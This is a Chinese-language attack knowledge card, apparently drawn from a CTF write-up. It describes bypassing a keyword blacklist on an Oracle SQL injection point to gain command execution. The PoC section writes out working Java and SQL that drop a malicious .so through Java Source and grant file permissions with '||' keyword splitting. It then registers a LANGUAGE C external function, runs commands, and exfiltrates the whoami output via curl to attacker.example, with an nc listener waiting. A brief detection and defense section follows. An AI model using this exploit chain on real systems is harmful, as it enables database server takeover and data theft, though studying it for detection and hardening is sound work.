---
id: web-generic-sqli-oracle-waf-java-source-write-so-library-rce
title: Oracle 注入黑名单环境绕过：Java Source 解压落地恶意 .so，再 CREATE LIBRARY 外部函数执行命令
type: scenario
domain: web
path: web/generic/sqli
technique: oracle-sqli-waf-java-source-write-so-library-rce
aliases:
- Oracle 注入写 so 提权
- JavaTool.write 落地 so
- DBMS_JAVA.GRANT_PERMISSION 绕过
- ez_oracle
- Oracle 黑名单注入 RCE
tags:
- oracle
- sql-injection
- waf-bypass
- java-source
- library
- rce
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V518
  verified_at: '2026-11-11T13:07:04+08:00'
  notes: 已对照原文与截图核对：ez_oracle 黑名单（select/exec/runtime/process 等）、JavaTool gzip 字节数组写 so、dbms_java.grant_permission 的 'e'||'xecute','del'||'ete' 拼接、写到 /opt/oracle/product/23c/dbhomeFree/evil.so、IF 匿名块替代 select、CREATE LIBRARY lib_evils、function rce ... name "cmd"、ORA-28595 与 extproc.ora、curl 外带（图45-58）均一致。注：图55为作者误区版 function cmd ... name "rce"，正文与卡采用修正后的 function rce ... name "cmd"，与图56报错 SYSTEM.RCE 及误区说明吻合。未验证点：PoC 未复跑；原文未给受影响版本。dedup_review 成立：与卡1同 sink 但触发条件是单语句注入+黑名单，so 投递与权限授予步骤不同。
---

## 一句话结论

当 Oracle SQL 注入点做了关键字黑名单（过滤 `select`、`exec`、`runtime`、`process`、`forname` 等 Java 命令执行相关词）时，仍然可以只用 `CREATE JAVA SOURCE` + `CREATE LIBRARY` 完成 RCE：先用一段「GZIP 解压后写文件」的 Java 类把恶意 `.so` 落到 `$ORACLE_HOME`，用 `dbms_java.grant_permission` 补上 `FilePermission`，再 `CREATE LIBRARY` + `LANGUAGE C` 注册外部函数执行系统命令；`select` 被黑名单时用 `BEGIN ... IF ... END;` 匿名块调用，`exec` 关键字用 `||` 拼接绕过。

## 原理

- **黑名单挡不住建对象**：题目式 WAF 通常按子串过滤 `select`、`runtime`、`process`、`exec`、`forname`、`defineclass` 等 Java 命令执行 API 词，但注入点本身允许任意 SQL 执行。`CREATE OR REPLACE AND COMPILE JAVA SOURCE` 仍可编译任意 Java 代码——只要代码里不出现被过滤的词，就能用 `java.io.FileOutputStream` 落盘、用 `java.util.zip.GZIPInputStream` 解压。
- **为什么用 gzip**：几个 KB 的 so 直接转成 `byte[]{...}` 会让 Java Source 语句极长，注入通道的服务端 `callTimeout`（如 5 秒）下编译/传输容易超时失败；gzip 压缩后再作为有符号字节数组嵌入源码，可显著缩短语句长度，运行时在数据库 JVM 内解压写盘。
- **为什么只能写到 `$ORACLE_HOME`**：Oracle JVM 进程对系统其他目录通常无写权限或路径未知；作者环境 `echo $ORACLE_HOME` 为 `/opt/oracle/product/23c/dbhomeFree/`，写 `/tmp/evil.so` 报 `ORA-29532 ... Permission ("java.io.FilePermission" "/tmp/evil.so" "write") has not been granted`。改成 `$ORACLE_HOME` 下路径后仍需显式授权。
- **Java 沙箱授权**：Oracle JVM 默认通过 Java 安全管理器限制文件读写与进程操作。`dbms_java.grant_permission('SYSTEM','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete')` 缺省会报权限错误；因为 `exec` 在黑名单里，用 `'e'||'xecute'`、`'del'||'ete'` 拼接即可让 WAF 看不到完整关键字。
- **最终执行走 extproc**：`CREATE LIBRARY lib AS '<ORACLE_HOME>/evil.so'` + `CREATE FUNCTION rce(str varchar2) ... LANGUAGE C LIBRARY lib NAME "cmd"` 让 extproc 代理进程加载 so，so 里的 `cmd()` 调 `system()`；这绕过了「不能用 Java Runtime/ProcessBuilder」的限制（so 是原生代码，WAF 只审 SQL 文本）。
- **23c 的 `ORA-28595`**：extproc 默认只允许加载 `$ORACLE_HOME/bin|lib` 下的库，直接指定 `$ORACLE_HOME/evil.so` 报 `Extproc agent: Invalid DLL Path`；需在 `$ORACLE_HOME/hs/admin/extproc.ora` 加 `SET EXTPROC_DLLS=ONLY:/opt/oracle/product/23c/dbhomeFree/evil.so`（或 `SET EXTPROC_DLLS=ANY`）。把 so 改写入 `$ORACLE_HOME/lib` 亦可命中默认白名单。
- **`select` 被禁止时的调用方式**：PL/SQL 匿名块不需要 `select` 前缀：
  ```sql
  BEGIN
    if (java_write('/opt/oracle/product/23c/dbhomeFree/evil.so') = 'ok')
    then dbms_output.put_line('Valid');
    else dbms_output.put_line('Invalid'); end if;
  END;
  ```
  命令执行同理用 `if (rce('/bin/cu'||'rl http://attacker/?'||'/bin/whoami') = 'ok') ...`，同时把 URL 等敏感串拼接拆开。

## 触发条件

- Oracle SQL 注入点可执行任意 SQL（单条语句即可，无需堆叠）；账号有 `CREATE JAVA SOURCE`、`CREATE LIBRARY`、`CREATE PROCEDURE`（如 `SYSTEM`/DBA）。
- WAF/黑名单过滤 Java 命令执行 API（`Runtime`、`ProcessBuilder`、`exec`、`forname` 等）和/或 `select`，但未拦截 `CREATE JAVA SOURCE`/`LIBRARY`。
- 已知 `$ORACLE_HOME` 路径（`echo $ORACLE_HOME` 或按版本/安装默认路径推断），且 JVM 对目标目录有写权限（授权后）。
- extproc 可加载目标路径（改 `extproc.ora` 或使用默认白名单目录）。
- 服务端 SQL 执行超时较短时，需要压缩（gzip 等）缩短 Java 源码体积。

## 利用步骤

1. 确认注入、版本与 `$ORACLE_HOME`：`select version from v$instance;`、`select banner from v$version;`，并推断安装目录（如 Oracle 23c Free 默认 `/opt/oracle/product/23c/dbhomeFree/`）。
2. 本地编译恶意 so（导出 `cmd()` 调 `system()`），`gzip` 压缩后转成有符号字节数组。
3. 注入创建 Java Source（源码见 PoC）：`JavaTool.write(path)` 用 `GZIPInputStream` 解压字节数组并 `FileOutputStream` 写目标路径，返回 `write ok`。
4. 注入创建 Java 函数映射：
   ```sql
   create or replace function java_write(path varchar2) return varchar2
     as language java name 'JavaTool.write(java.lang.String) return java.lang.String';
   ```
5. 调用写文件。若报 `ORA-29532` 权限错误，先授权（`exec` 需拆分）：
   ```sql
   begin
     dbms_java.grant_permission('SYSTEM','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,e'||'xecute,del'||'ete');
   end;
   ```
   然后再调用 `java_write` 写入 so。
6. 注册外部库与函数：
   ```sql
   create or replace library lib_evils as '/opt/oracle/product/23c/dbhomeFree/evil.so';
   create or replace function rce(str varchar2) return varchar2
     as language c library lib_evils name "cmd";
   ```
7. 用匿名块调用 `rce` 执行命令并外带回显；若 `ORA-28595`，在 `extproc.ora` 中 `SET EXTPROC_DLLS=ONLY:<so路径>`（或 ANY）后重试。
8. 若禁止执行 `/bin` 下命令，可改用 Oracle 自带工具（如 `$ORACLE_HOME/perl/bin/perl`）读 flag 外带。

## PoC

```java
// JavaTool 的 write()：字节数组为 gzip 压缩后的恶意 so（省略大段数组，示意）
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "JavaTool" AS
import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.util.zip.GZIPInputStream;

public class JavaTool {
    public static String write(String path) throws Exception {
        byte[] data = new byte[]{ /* gzip(evil.so) 字节 */ };
        GZIPInputStream gz = new GZIPInputStream(new ByteArrayInputStream(data));
        FileOutputStream out = new FileOutputStream(path);
        byte[] buf = new byte[1024];
        int len;
        while ((len = gz.read(buf)) > 0) out.write(buf, 0, len);
        gz.close(); out.close();
        return "write ok";
    }
}
```

```sql
-- 1. 建 Java Source、建映射函数
create or replace function java_write(path varchar2) return varchar2
  as language java name 'JavaTool.write(java.lang.String) return java.lang.String';
-- 2. 授权（exec/delete 用 || 拆开绕过黑名单）
begin
  dbms_java.grant_permission('SYSTEM','SYS:java.io.FilePermission','<<ALL FILES>>','read,write,e'||'xecute,del'||'ete');
end;
-- 3. 写 so（select 被过滤时用匿名块）
begin
  if (java_write('/opt/oracle/product/23c/dbhomeFree/evil.so') = 'ok')
  then dbms_output.put_line('Valid'); else dbms_output.put_line('Invalid'); end if;
end;
-- 4. 注册外部库与函数（name 必须等于 so 内导出的函数名）
create or replace library lib_evils as '/opt/oracle/product/23c/dbhomeFree/evil.so';
create or replace function rce(str varchar2) return varchar2
  as language c library lib_evils name "cmd";
-- 5. 执行命令并外带（命令与 URL 继续用 || 拆开）
begin
  if (rce('/bin/cu'||'rl ht'||'tp://attacker.example:7775?a=`/bin/whoami`') = 'ok')
  then dbms_output.put_line('Valid'); else dbms_output.put_line('Invalid'); end if;
end;
```

```bash
# 攻击端监听（收到 curl 的 GET /?a=<whoami 结果> 即确认 RCE）
nc -lvnp 7775
```

## 变体与关联

- **直接 CREATE LIBRARY 的手法**见 [[web-generic-sqli-oracle-create-library-external-so-command-exec]]；本卡解决的是「先要投递 so + 黑名单过滤」的前置问题，两者可串联。
- **sql 文件落地执行**：若能任意写文件，可把授权与 RCE 语句写成 `permission.sql`/`rce.sql`，再用 `@/path/rce.sql` 让 sqlplus 批量执行；本质是「多语句执行通道」，依赖已有文件写能力。
- **其它 Oracle 执行面**：不设黑名单时可直接 `CREATE JAVA SOURCE` 调 `Runtime.exec`（需要 `DBMS_JVM_EXP_PERMS` 授 `java.io.FilePermission`/`RuntimePermission`）；`dbms_xmlquery.newcontext` 可在单语句注入点动态执行 DDL（见 [[web-generic-sqli-oracle-dbms-xmlquery-java-source-command-exec]]）。
- **`dbms_java.runjava`/`dbms_java_test.funcall`**：理论上可包装执行，但依赖 `oracle/aurora/util/Wrapper` 类存在，本环境报 `ORA-29540 类 ... 不存在`，未打通。
- **名称语义坑**：`CREATE FUNCTION ... NAME "cmd"` 中 `"cmd"` 是 so 内函数名，不是 SQL 函数名；写错会调用失败。

## 检测与防御

- **检测**：审计 `CREATE JAVA SOURCE`、`CREATE LIBRARY`、`LANGUAGE C`、`dbms_java.grant_permission` 等语句；关注 `ORA-29532`/`ORA-28595` 报错；`$ORACLE_HOME` 下出现异常 `.so` 文件；extproc 进程派生 `sh`/`perl`/`curl` 子进程或发起对外连接；`extproc.ora` 被改为 `ANY` 或非默认路径。
- **防御**：连接账号最小权限，禁止 `CREATE JAVA SOURCE`/`CREATE LIBRARY`/`CREATE PROCEDURE`；回收 `dbms_java` 执行权限；WAF 不能只做关键字黑名单，应阻断 DDL 类注入语句并对 SQL 做语法级校验；`extproc.ora` 维持严格白名单；监控 `$ORACLE_HOME` 文件完整性与数据库账号 DDL 行为。
